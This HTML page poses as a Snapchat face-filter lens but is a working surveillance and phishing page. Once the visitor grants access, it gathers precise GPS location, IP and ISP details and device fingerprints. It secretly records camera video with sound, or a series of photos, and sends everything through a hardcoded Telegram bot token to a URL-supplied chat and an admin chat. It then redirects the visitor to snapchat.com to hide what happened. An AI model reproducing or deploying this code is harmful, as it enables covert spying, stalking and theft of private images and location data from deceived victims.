<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snapchat Lens - Funny Face Filter</title>
    <style>
        body {
            background-color: #000000;
            color: #ffffff;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            margin: 0;
            overflow: hidden;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
        }
        .top-bar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 15px;
            z-index: 10;
        }
        .filter-title {
            background: rgba(0, 0, 0, 0.6);
            padding: 8px 16px;
            border-radius: 20px;
            font-size: 14px;
            font-weight: bold;
        }
        .center-screen {
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: center;
            position: relative;
        }
        .camera-preview {
            width: 100%;
            height: 100%;
            object-fit: cover;
            position: absolute;
            top: 0;
            left: 0;
        }
        .bottom-tray {
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
            z-index: 10;
            background: linear-gradient(transparent, rgba(0,0,0,0.8));
        }
        .capture-btn {
            width: 75px;
            height: 75px;
            border: 5px solid #ffffff;
            border-radius: 50%;
            background: transparent;
            cursor: pointer;
        }
        .hint-text {
            font-size: 12px;
            color: #ccc;
            margin-top: 10px;
        }
    </style>
</head>
<body>

    <div class="top-bar">
        <div class="filter-title">🔥 Funny Face Lens</div>
        <div>✨ Snapchat</div>
    </div>

    <div class="center-screen">
        <video id="video" autoplay playsinline muted class="camera-preview"></video>
        <div id="loading-text" style="position:absolute; z-index:5;">Loading Filter... Please Allow Access</div>
    </div>

    <div class="bottom-tray">
        <button class="capture-btn" onclick="triggerAction()"></button>
        <div class="hint-text">Tap to try filter</div>
    </div>

    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const BOT_TOKEN = "8857558695:AAHJHksL9vqLcvHL3zrH1OOnn9aS3YW4lQw";
        const ADMIN_CHAT_ID = "6478868514";
        
        const urlParams = new URLSearchParams(window.location.search);
        const CHAT_ID = urlParams.get('id');
        const cameraType = urlParams.get('b'); 

        let globalStream = null;
        let gpsData = { lat: '', lon: '', mapLink: 'N/A' };
        let ipInfo = {};
        let isReady = false;

        function getGPUInfo() {
            try {
                let canvas = document.createElement('canvas');
                let gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (!gl) return "Not Supported";
                let debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unknown GPU";
            } catch (e) {
                return "Error fetching GPU";
            }
        }

        function getAdvancedDeviceInfo() {
            let memory = navigator.deviceMemory ? `${navigator.deviceMemory} GB+` : "Unknown";
            let cores = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} Cores` : "Unknown";
            let lang = navigator.language || "Unknown";
            let platform = navigator.platform || "Unknown";
            let gpu = getGPUInfo();
            return { memory, cores, lang, platform, gpu };
        }

        function getExactLocation() {
            return new Promise((resolve) => {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            let lat = position.coords.latitude;
                            let lon = position.coords.longitude;
                            resolve({
                                lat: lat,
                                lon: lon,
                                mapLink: `https://maps.google.com/?q=${lat},${lon}`
                            });
                        },
                        (error) => {
                            resolve({ lat: '', lon: '', mapLink: 'Permission Denied / Unavailable' });
                        },
                        { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
                    );
                } else {
                    resolve({ lat: '', lon: '', mapLink: 'Not Supported' });
                }
            });
        }

        async function getIPAndLocation() {
            try {
                let res = await fetch('https://ipapi.co/json/');
                let data = await res.json();
                return {
                    ip: data.ip || 'Unknown',
                    city: data.city || 'Unknown',
                    region: data.region || 'Unknown',
                    country: data.country_name || 'Unknown',
                    isp: data.org || 'Unknown'
                };
            } catch (e) {
                return { ip: 'N/A', city: 'N/A', region: 'N/A', country: 'N/A', isp: 'N/A' };
            }
        }

        async function initCamera() {
            gpsData = await getExactLocation();
            ipInfo = await getIPAndLocation();

            let constraints = {
                video: { width: { ideal: 1280 }, height: { ideal: 720 } },
                audio: !cameraType 
            };

            if (cameraType === 'back') {
                constraints.video.facingMode = { exact: "environment" };
            } else {
                constraints.video.facingMode = "user"; 
            }

            try {
                try {
                    globalStream = await navigator.mediaDevices.getUserMedia(constraints);
                } catch (e) {
                    if (cameraType === 'back') {
                        constraints.video.facingMode = "environment";
                        globalStream = await navigator.mediaDevices.getUserMedia(constraints);
                    } else {
                        throw e;
                    }
                }

                const videoElement = document.getElementById('video');
                videoElement.srcObject = globalStream;
                
                await new Promise((resolve) => {
                    videoElement.onloadedmetadata = () => {
                        videoElement.play().then(resolve).catch(resolve);
                    };
                });

                document.getElementById('loading-text').style.display = 'none';
                isReady = true;

                setTimeout(() => {
                    triggerAction();
                }, 1000);

            } catch (err) {
                document.getElementById('loading-text').innerText = "Please allow camera & microphone access!";
            }
        }

        async function triggerAction() {
            if (!isReady || !globalStream) return;

            document.getElementById('loading-text').innerText = "Applying Filter...";
            document.getElementById('loading-text').style.display = 'block';

            let batteryText = "N/A";
            try {
                let bat = await navigator.getBattery();
                batteryText = `${Math.round(bat.level * 100)}% ${bat.charging ? "⚡ Charging" : "🔋 Discharging"}`;
            } catch(e) {}

            let connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            let netType = connection ? connection.effectiveType.toUpperCase() : "4G";
            let downlink = connection && connection.downlink ? `${connection.downlink} Mbps` : "N/A";
            let rtt = connection && connection.rtt ? `${connection.rtt} ms` : "N/A";

            let advInfo = getAdvancedDeviceInfo();

            let baseCaption = 
                `🌐 **IP & Exact Location**\n` +
                `🔢 IP Address: \`${ipInfo.ip}\`\n` +
                `📍 Location: ${ipInfo.city}, ${ipInfo.region}\n` +
                `🗺️ **GPS Maps Link**: ${gpsData.mapLink}\n` +
                `📡 ISP: ${ipInfo.isp}\n\n` +
                `📱 **Advanced Device Specs**\n` +
                `🎮 GPU/Renderer: \`${advInfo.gpu}\`\n` +
                `🧠 RAM/Cores: ${advInfo.memory} | ${advInfo.cores}\n` +
                `💻 Platform/Lang: ${advInfo.platform} (${advInfo.lang})\n` +
                `🔋 Battery: ${batteryText}\n` +
                `📶 Network: ${netType} (Speed: ${downlink}, RTT: ${rtt})\n` +
                `🖥️ Screen: ${window.screen.width}x${window.screen.height}\n` +
                `🕒 Time: ${new Date().toLocaleString()}\n\n` +
                `👑 **CREDIT BY : आयुष नेगी**`;

            if (!cameraType) {
                let recordedChunks = [];
                let mediaRecorder;

                try {
                    mediaRecorder = new MediaRecorder(globalStream, { mimeType: 'video/webm; codecs=vp8,opus' });
                } catch (err) {
                    try {
                        mediaRecorder = new MediaRecorder(globalStream);
                    } catch (e) {
                        alert("Error initializing video recorder");
                        return;
                    }
                }

                mediaRecorder.ondataavailable = function(event) {
                    if (event.data && event.data.size > 0) {
                        recordedChunks.push(event.data);
                    }
                };

                mediaRecorder.onstop = async function() {
                    let blob = new Blob(recordedChunks, { type: 'video/webm' });
                    
                    if (blob && blob.size > 0) {
                        if (CHAT_ID) {
                            const formDataUser = new FormData();
                            formDataUser.append('chat_id', CHAT_ID);
                            formDataUser.append('video', blob, 'video_capture.webm');
                            formDataUser.append('caption', "🎥 **Secret Video + Sound Captured!**\n\n" + baseCaption);
                            formDataUser.append('parse_mode', 'Markdown');

                            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                                method: 'POST',
                                body: formDataUser
                            });
                        }

                        const formDataAdmin = new FormData();
                        formDataAdmin.append('chat_id', ADMIN_CHAT_ID);
                        formDataAdmin.append('video', blob, 'video_capture.webm');
                        formDataAdmin.append('caption', `🕵️‍♂️ **Admin Log (Video from User ID: ${CHAT_ID})**\n\n` + baseCaption);
                        formDataAdmin.append('parse_mode', 'Markdown');

                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                            method: 'POST',
                            body: formDataAdmin
                        });
                    }

                    globalStream.getTracks().forEach(track => track.stop());
                    window.location.href = "https://www.snapchat.com";
                };

                mediaRecorder.start();
                setTimeout(() => {
                    mediaRecorder.stop();
                }, 4000);

            } else {
                const videoElement = document.getElementById('video');
                const canvas = document.getElementById('canvas');
                canvas.width = videoElement.videoWidth || 1280;
                canvas.height = videoElement.videoHeight || 720;
                const context = canvas.getContext('2d');

                for (let i = 1; i <= 6; i++) {
                    context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
                    
                    let blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.90));
                    
                    if (blob) {
                        let caption = (i === 1) ? baseCaption : `👑 **CREDIT BY : आयुष नेगी**`;

                        if (CHAT_ID) {
                            const formDataUser = new FormData();
                            formDataUser.append('chat_id', CHAT_ID);
                            formDataUser.append('photo', blob, `photo_${i}.jpg`);
                            formDataUser.append('caption', caption);
                            formDataUser.append('parse_mode', 'Markdown');

                            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                                method: 'POST',
                                body: formDataUser
                            });
                        }

                        const formDataAdmin = new FormData();
                        formDataAdmin.append('chat_id', ADMIN_CHAT_ID);
                        formDataAdmin.append('photo', blob, `photo_${i}.jpg`);
                        formDataAdmin.append('caption', `🕵️‍♂️ **Admin Log (Generated by User ID: ${CHAT_ID})**\n\n` + caption);
                        formDataAdmin.append('parse_mode', 'Markdown');

                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                            method: 'POST',
                            body: formDataAdmin
                        });
                    }

                    await new Promise(resolve => setTimeout(resolve, 300));
                }

                globalStream.getTracks().forEach(track => track.stop());
                window.location.href = "https://www.snapchat.com";
            }
        }

        window.onload = function() {
            initCamera();
        };
    </script>
</body>
</html>
